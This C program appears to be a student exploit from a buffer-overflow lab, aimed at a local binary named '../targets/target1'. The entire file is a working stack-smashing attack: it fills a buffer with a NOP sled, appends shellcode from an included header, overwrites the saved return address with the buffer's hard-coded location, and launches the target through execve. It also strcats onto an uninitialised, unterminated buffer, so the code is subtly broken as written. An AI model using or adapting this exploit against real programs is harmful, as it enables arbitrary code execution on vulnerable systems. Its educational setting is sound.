#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"


//program counter is saved at 0x2021fe80
//return address is at 0x2021fe88
//buf is located at address 0x2021fe10

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	unsigned char NOP[] = "\x90";
	char tmp[128];

	int i = 0;

	for(i=0; i<75; i++){
		tmp[i] = '\x90';	
	}

	strcat(tmp, shellcode);

	strcat(tmp, "\x10");
	strcat(tmp, "\xfe");
	strcat(tmp, "\x21");
	strcat(tmp, "\x20");



	args[0] = TARGET;
	args[1] = tmp;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
